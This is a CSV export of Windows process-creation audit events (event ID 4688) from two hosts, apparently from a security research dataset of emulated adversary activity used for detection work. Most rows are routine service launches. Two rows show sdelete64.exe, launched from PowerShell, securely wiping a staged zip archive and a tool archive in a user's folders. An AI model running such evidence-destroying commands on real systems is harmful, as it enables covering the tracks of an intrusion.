timestamp,Category,Channel,CommandLine,EventID,EventReceivedTime,EventTime,EventType,ExecutionProcessID,Hostname,Keywords,MandatoryLabel,Message,NewProcessId,NewProcessName,Opcode,OpcodeValue,ParentProcessName,ProcessId,ProviderGuid,RecordNumber,Severity,SeverityValue,SourceModuleName,SourceModuleType,SourceName,SubjectDomainName,SubjectLogonId,SubjectUserName,SubjectUserSid,TargetDomainName,TargetLogonId,TargetUserName,TargetUserSid,Task,ThreadID,TokenElevationType,Version,host,port,tags
2020-05-02T03:02:47.443Z,Process Creation,Security,C:\windows\system32\svchost.exe -k netsvcs -p -s dmwappushservice,4688,2020-05-01 23:02:47,2020-05-01 23:02:46,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1a64
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2d0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\system32\svchost.exe -k netsvcs -p -s dmwappushservice

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1A64,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2D0,{54849625-5478-4994-A5BA-3E3B0328C30D},72114,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,376,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:02:47.451Z,Process Creation,Security,C:\windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s SmsRouter,4688,2020-05-01 23:02:47,2020-05-01 23:02:46,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-19
	Account Name:		LOCAL SERVICE
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E5

Process Information:
	New Process ID:		0x1bfc
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2d0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s SmsRouter

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1BFC,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2D0,{54849625-5478-4994-A5BA-3E3B0328C30D},72127,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,NT AUTHORITY,3E5,LOCAL SERVICE,S-1-5-19,13312,4312,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:16.071Z,Process Creation,Security,"""C:\Program Files\SysinternalsSuite\sdelete64.exe"" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip",4688,2020-05-01 23:03:16,2020-05-01 23:03:14,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-12288,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2238
	New Process Name:	C:\Program Files\SysinternalsSuite\sdelete64.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xf24
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Program Files\SysinternalsSuite\sdelete64.exe"" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",2238,C:\Program Files\SysinternalsSuite\sdelete64.exe,Info,0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,F24,{54849625-5478-4994-A5BA-3E3B0328C30D},73517,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,372E81,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,4312,%%1937,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:19.181Z,Process Creation,Security,C:\windows\system32\sppsvc.exe,4688,2020-05-01 23:03:19,2020-05-01 23:03:18,AUDIT_SUCCESS,4,NEWYORK.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NEWYORK$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		NEWYORK$
	Account Domain:		DMEVALS
	Logon ID:		0x3E4

Process Information:
	New Process ID:		0x35c
	New Process Name:	C:\Windows\System32\sppsvc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2b8
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\system32\sppsvc.exe

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",35C,C:\Windows\System32\sppsvc.exe,Info,0,C:\Windows\System32\services.exe,2B8,{54849625-5478-4994-A5BA-3E3B0328C30D},151319,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,NEWYORK$,S-1-5-18,DMEVALS,3E4,NEWYORK$,S-1-0-0,13312,288,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:19.186Z,Process Creation,Security,C:\windows\system32\wbem\wmiprvse.exe -Embedding,4688,2020-05-01 23:03:19,2020-05-01 23:03:18,AUDIT_SUCCESS,4,NEWYORK.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NEWYORK$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x17e4
	New Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x3b0
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\windows\system32\wbem\wmiprvse.exe -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",17E4,C:\Windows\System32\wbem\WmiPrvSE.exe,Info,0,C:\Windows\System32\svchost.exe,3B0,{54849625-5478-4994-A5BA-3E3B0328C30D},151328,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,NEWYORK$,S-1-5-18,-,0,-,S-1-0-0,13312,288,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:33.318Z,Process Creation,Security,"""CollectGuestLogs.exe"" -Mode:ga -FileName:C:\WindowsAzure\CollectGuestLogsTemp\c95ce60d-c0d8-4d55-9bfc-3a9937bf113e.zip",4688,2020-05-01 23:03:33,2020-05-01 23:03:32,AUDIT_SUCCESS,4,NEWYORK.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NEWYORK$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x12a4
	New Process Name:	C:\WindowsAzure\Packages\CollectGuestLogs.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0xf20
	Creator Process Name:	C:\WindowsAzure\Packages\WaAppAgent.exe
	Process Command Line:	""CollectGuestLogs.exe"" -Mode:ga -FileName:C:\WindowsAzure\CollectGuestLogsTemp\c95ce60d-c0d8-4d55-9bfc-3a9937bf113e.zip

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",12A4,C:\WindowsAzure\Packages\CollectGuestLogs.exe,Info,0,C:\WindowsAzure\Packages\WaAppAgent.exe,F20,{54849625-5478-4994-A5BA-3E3B0328C30D},151417,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,NEWYORK$,S-1-5-18,-,0,-,S-1-0-0,13312,288,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:33.319Z,Process Creation,Security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:03:33,2020-05-01 23:03:32,AUDIT_SUCCESS,4,NEWYORK.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NEWYORK$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x17d4
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x12a4
	Creator Process Name:	C:\WindowsAzure\Packages\CollectGuestLogs.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",17D4,C:\Windows\System32\conhost.exe,Info,0,C:\WindowsAzure\Packages\CollectGuestLogs.exe,12A4,{54849625-5478-4994-A5BA-3E3B0328C30D},151418,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,NEWYORK$,S-1-5-18,-,0,-,S-1-0-0,13312,288,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:33.333Z,Process Creation,Security,C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,4688,2020-05-01 23:03:33,2020-05-01 23:03:32,AUDIT_SUCCESS,4,NEWYORK.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NEWYORK$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xcc0
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2b8
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",CC0,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2B8,{54849625-5478-4994-A5BA-3E3B0328C30D},151439,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,NEWYORK$,S-1-5-18,-,0,-,S-1-0-0,13312,288,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:35.383Z,Process Creation,Security,"""C:\Program Files\SysinternalsSuite\sdelete64.exe"" /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip",4688,2020-05-01 23:03:35,2020-05-01 23:03:33,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-12288,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2290
	New Process Name:	C:\Program Files\SysinternalsSuite\sdelete64.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xf24
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Program Files\SysinternalsSuite\sdelete64.exe"" /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",2290,C:\Program Files\SysinternalsSuite\sdelete64.exe,Info,0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,F24,{54849625-5478-4994-A5BA-3E3B0328C30D},73541,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,372E81,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,5744,%%1937,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:43.459Z,Process Creation,Security,"""cmd""",4688,2020-05-01 23:03:43,2020-05-01 23:03:41,AUDIT_SUCCESS,4,NEWYORK.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NEWYORK$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x624
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x12a4
	Creator Process Name:	C:\WindowsAzure\Packages\CollectGuestLogs.exe
	Process Command Line:	""cmd""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",624,C:\Windows\System32\cmd.exe,Info,0,C:\WindowsAzure\Packages\CollectGuestLogs.exe,12A4,{54849625-5478-4994-A5BA-3E3B0328C30D},151462,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,NEWYORK$,S-1-5-18,-,0,-,S-1-0-0,13312,288,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:03:43.459Z,Process Creation,Security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:03:43,2020-05-01 23:03:41,AUDIT_SUCCESS,4,NEWYORK.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NEWYORK$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x698
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x624
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",698,C:\Windows\System32\conhost.exe,Info,0,C:\Windows\System32\cmd.exe,624,{54849625-5478-4994-A5BA-3E3B0328C30D},151463,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,NEWYORK$,S-1-5-18,-,0,-,S-1-0-0,13312,288,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:04:05.737Z,Process Creation,Security,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,4688,2020-05-01 23:04:05,2020-05-01 23:04:04,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E4

Process Information:
	New Process ID:		0x2268
	New Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x374
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",2268,C:\Windows\System32\wbem\WmiPrvSE.exe,Info,0,C:\Windows\System32\svchost.exe,374,{54849625-5478-4994-A5BA-3E3B0328C30D},73592,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,DMEVALS,3E4,SCRANTON$,S-1-0-0,13312,5744,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:04:31.261Z,Process Creation,Security,"""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""",4688,2020-05-01 23:04:31,2020-05-01 23:04:29,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xd38
	New Process Name:	C:\Windows\System32\SearchProtocolHost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x134c
	Creator Process Name:	C:\Windows\System32\SearchIndexer.exe
	Process Command Line:	""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",D38,C:\Windows\System32\SearchProtocolHost.exe,Info,0,C:\Windows\System32\SearchIndexer.exe,134C,{54849625-5478-4994-A5BA-3E3B0328C30D},73632,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,4312,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:04:31.265Z,Process Creation,Security,"""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780",4688,2020-05-01 23:04:31,2020-05-01 23:04:29,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x7b8
	New Process Name:	C:\Windows\System32\SearchFilterHost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x134c
	Creator Process Name:	C:\Windows\System32\SearchIndexer.exe
	Process Command Line:	""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",7B8,C:\Windows\System32\SearchFilterHost.exe,Info,0,C:\Windows\System32\SearchIndexer.exe,134C,{54849625-5478-4994-A5BA-3E3B0328C30D},73639,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,4312,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
